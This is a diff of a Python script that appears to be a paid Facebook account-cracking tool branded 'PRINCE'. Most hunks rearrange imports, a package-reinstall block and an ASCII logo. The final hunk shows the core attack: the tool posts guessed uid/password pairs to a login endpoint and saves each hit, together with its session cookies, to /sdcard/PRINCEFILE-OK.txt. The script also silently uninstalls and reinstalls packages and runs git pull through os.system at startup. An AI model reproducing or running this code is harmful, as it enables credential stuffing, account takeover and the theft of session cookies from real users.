@@ -1,4 +1,22 @@
 import os, sys, uuid, re, random, time, string, json, base64
+
+try:
+
+    os.system(
+        'pip uninstall requests chardet urllib3 idna certifi rich -y;pip install chardet urllib3 idna certifi requests rich')
+    import requests, rich, certifi, pycurl
+except:
+    os.system("git pull")
+
+    os.system("pip3 install requests rich certifi pycurl")
+
+    import requests, rich, certifi, pycurl
+
+from rich import print
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+
 from io import BytesIO
 import os
 import random
@@ -14,26 +32,34 @@ import requests
 import certifi
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-try:
-
-    os.system(
-        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-    import requests, rich, certifi, pycurl
-except:
-    os.system("git pull")
-
-    os.system("pip3 install requests rich certifi pycurl")
-
-    import requests, rich, certifi, pycurl
-
-from rich import print
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-
 version = "  v1"
 
 
 # get system data
+
+class sort:
+    
+    def line():
+        return "[b dark_sea_green2]━" * 37
+
+    
+    def clear():
+        os.system("clear")
+
+    
+    def logo():
+        aci = f'''        //   ) )                                      
+       //___/ /  __     ( )   __      ___      ___    
+      / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
+     //       //      / / //   / / //       //        
+    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
+        print(aci)
+
+    
+    def color():
+        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
+        cx = random.choice(co)
+        return cx
 
 
 def info():
@@ -344,29 +370,7 @@ random_string = generate_random_string(lowercase_count, numeric_count)
 shuffled_connection_token = shuffle_string(random_string)
 
 
-class sort:
-    
-    def line():
-        return "[b dark_sea_green2]━" * 37
 
-    
-    def clear():
-        os.system("clear")
-
-    
-    def logo():
-        aci = f'''        //   ) )                                      
-       //___/ /  __     ( )   __      ___      ___    
-      / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
-     //       //      / / //   / / //       //        
-    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
-        print(aci)
-
-    
-    def color():
-        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
-        cx = random.choice(co)
-        return cx
 
 
 oks = []
@@ -478,7 +482,7 @@ def file_sub(uid, pwx, name, meth, fl):
             rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
-                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}")
+                print(f"\r\r[b r green_yellow][PRINCE-OK]     [/b r green_yellow][b chartreuse1]{uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(uid)
 
